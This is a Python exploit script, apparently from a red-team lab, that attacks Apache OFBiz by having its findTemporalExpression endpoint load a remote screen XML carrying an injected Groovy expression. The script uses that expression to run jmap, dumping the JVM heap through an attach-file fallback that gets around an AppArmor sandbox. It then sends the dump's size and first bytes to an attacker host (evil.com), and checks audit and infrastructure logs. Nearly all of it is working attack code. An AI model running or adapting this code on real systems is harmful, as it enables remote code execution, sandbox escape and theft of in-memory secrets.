# -*- coding: utf-8 -*-
"""RT5-E OFBiz: JVM-attach side channel via CWD fallback.
   /tmp write denial supposedly blocks HotSpot attach (.attach_pid<pid> lives in /tmp).
   BUT HotSpot falls back to <cwd>/.attach_pid<pid>; OFBiz JVM cwd =
   /usr/src/apache-ofbiz which the profile allows rwkm. jmap is ix-granted.
   => heap dump of the profiled JVM into the app tree + size exfil.
"""
import io
import os
import subprocess

import requests
import urllib3

urllib3.disable_warnings()

HERE = os.path.dirname(os.path.abspath(__file__))
WWW = r"D:\Amywork\AgentSelf_Evolve\experiment\multi-round-lab\infrastructure\www\payloads"
G = "${groovy:"


def xml_for(name, script):
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
        '        xmlns="http://ofbiz.apache.org/Widget-Screen" '
        'xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen '
        'http://ofbiz.apache.org/dtds/widget-screen.xsd">\n'
        '    <screen name="TemporalExpressionDecorator">\n'
        '        <section>\n'
        '            <actions>\n'
        '                <set value="' + G + script + '}"/>\n'
        '            </actions>\n'
        '        </section>\n'
        '    </screen>\n'
    )


def fire(fname, script, timeout=170):
    with io.open(os.path.join(WWW, fname), "w", encoding="utf-8", newline="\n") as f:
        f.write(xml_for(fname, script) + '</screens>\n')
    s = requests.Session()
    s.trust_env = False
    s.verify = False
    body = "tempExprDecoratorLocation=%09http://evil.com:8000/payloads/" + fname
    try:
        r = s.post("https://127.0.0.1:18081/webtools/control/main/findTemporalExpression",
                   data=body, headers={"Content-Type": "application/x-www-form-urlencoded"},
                   timeout=timeout, allow_redirects=False)
        return "HTTP %s (%dB)" % (r.status_code, len(r.content))
    except Exception as e:  # noqa: BLE001
        return "EXC %s" % e


# E1: run jmap (attach) -> heap dump into app tree
print("[*] E1 jmap dump:", fire(
    "rt5_ofbiz_e1.xml",
    "'/usr/local/openjdk-8/bin/jmap -dump:format=b,file=/usr/src/apache-ofbiz/rt5_heap.hprof 1'"
    ".execute().waitFor();"))

r = subprocess.run(["docker", "exec", "multi-round-lab-ofbiz-1", "ls", "-l", "--full-time",
                    "/usr/src/apache-ofbiz/rt5_heap.hprof",
                    "/usr/src/apache-ofbiz/.attach_pid1",
                    "/usr/src/apache-ofbiz/.java_pid1",
                    "/tmp/.attach_pid1", "/tmp/.java_pid1"],
                   capture_output=True, text=True)
print((r.stdout + r.stderr).strip())

# E2: exfil proof-of-heap (size + first bytes hex) over residual network
print("[*] E2 heap exfil:", fire(
    "rt5_ofbiz_e2.xml",
    "java.io.InputStream is=new java.io.FileInputStream("
    "'/usr/src/apache-ofbiz/rt5_heap.hprof');"
    "byte[] b=new byte[64];is.read(b);is.close();"
    "new URL('http://evil.com:8000/rt5/ofbiz_heap?size='"
    "+new File('/usr/src/apache-ofbiz/rt5_heap.hprof').length()"
    "+'&head='+java.util.Base64.getEncoder().encodeToString(b))"
    ".getContent();", timeout=120))

print("\n=== audit (aa-ofbiz attach-related) ===")
r = subprocess.run(["wsl", "-u", "root", "--", "bash", "-c",
                    "dmesg | grep 'apparmor=\"DENIED\"' | grep 'aa-ofbiz' | grep -iE 'attach|java_pid' | tail -6"],
                   capture_output=True, text=True)
print(r.stdout + r.stderr)

print("=== infra log (heap exfil) ===")
r = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "4m"],
                   capture_output=True, text=True)
for line in (r.stdout + r.stderr).splitlines():
    if "/rt5/ofbiz_heap" in line:
        print("[infra] " + line[:300])
